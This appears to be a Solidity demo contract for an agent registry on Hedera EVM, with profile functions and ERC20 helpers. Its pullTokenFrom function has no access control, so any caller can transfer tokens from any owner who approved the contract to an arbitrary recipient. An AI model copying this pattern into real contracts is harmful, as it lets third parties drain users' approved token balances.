// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

/**
 * Simple Agent Registry to demonstrate deployment on Hedera EVM.
 * Allows an address to register a display name and optional metadata hash.
 */
contract AgentRegistry {
    struct AgentProfile {
        string name;
        string metadata; // e.g., IPFS CID or JSON hash
    }

    mapping(address => AgentProfile) private profiles;
    event AgentRegistered(address indexed agent, string name, string metadata);
    event AgentUpdated(address indexed agent, string name, string metadata);
    event AgentUnregistered(address indexed agent);
    event TokenTransfer(address indexed token, address indexed from, address indexed to, uint256 amount);

    function register(string calldata name, string calldata metadata) external {
        require(bytes(name).length > 0, "Name required");
        require(bytes(profiles[msg.sender].name).length == 0, "Already registered");
        profiles[msg.sender] = AgentProfile({ name: name, metadata: metadata });
        emit AgentRegistered(msg.sender, name, metadata);
    }

    function update(string calldata name, string calldata metadata) external {
        require(bytes(profiles[msg.sender].name).length != 0, "Not registered");
        profiles[msg.sender] = AgentProfile({ name: name, metadata: metadata });
        emit AgentUpdated(msg.sender, name, metadata);
    }

    function unregister() external {
        require(bytes(profiles[msg.sender].name).length != 0, "Not registered");
        delete profiles[msg.sender];
        emit AgentUnregistered(msg.sender);
    }

    function isRegistered(address agent) external view returns (bool) {
        return bytes(profiles[agent].name).length != 0;
    }

    function myProfile() external view returns (string memory name, string memory metadata) {
        AgentProfile memory p = profiles[msg.sender];
        return (p.name, p.metadata);
    }

    function setName(string calldata name) external {
        require(bytes(name).length > 0, "Name required");
        require(bytes(profiles[msg.sender].name).length != 0, "Not registered");
        AgentProfile storage p = profiles[msg.sender];
        p.name = name;
        emit AgentUpdated(msg.sender, p.name, p.metadata);
    }

    function setMetadata(string calldata metadata) external {
        require(bytes(profiles[msg.sender].name).length != 0, "Not registered");
        AgentProfile storage p = profiles[msg.sender];
        p.metadata = metadata;
        emit AgentUpdated(msg.sender, p.name, p.metadata);
    }

    /**
     * Return ERC20 token balance for any owner.
     * Mirrors Easy Wallet's balance tool using ERC20 interface.
     */
    function balanceOfToken(address token, address owner) external view returns (uint256) {
        return IERC20(token).balanceOf(owner);
    }

    /**
     * Transfer ERC20 tokens using the caller's allowance.
     * Caller must first approve this contract as spender on the token.
     */
    function transferTokenFrom(address token, address to, uint256 amount) external returns (bool) {
        require(to != address(0), "Invalid recipient");
        uint256 allowed = IERC20(token).allowance(msg.sender, address(this));
        require(allowed >= amount, "Insufficient allowance");
        bool ok = IERC20(token).transferFrom(msg.sender, to, amount);
        require(ok, "transferFrom failed");
        emit TokenTransfer(token, msg.sender, to, amount);
        return true;
    }

    /**
     * Transfer ERC20 tokens from any owner who has approved this contract.
     * Useful for agent-triggered actions against owner allowances.
     */
    function pullTokenFrom(address token, address owner, address to, uint256 amount) external returns (bool) {
        require(owner != address(0), "Invalid owner");
        require(to != address(0), "Invalid recipient");
        uint256 allowed = IERC20(token).allowance(owner, address(this));
        require(allowed >= amount, "Insufficient allowance");
        bool ok = IERC20(token).transferFrom(owner, to, amount);
        require(ok, "transferFrom failed");
        emit TokenTransfer(token, owner, to, amount);
        return true;
    }
}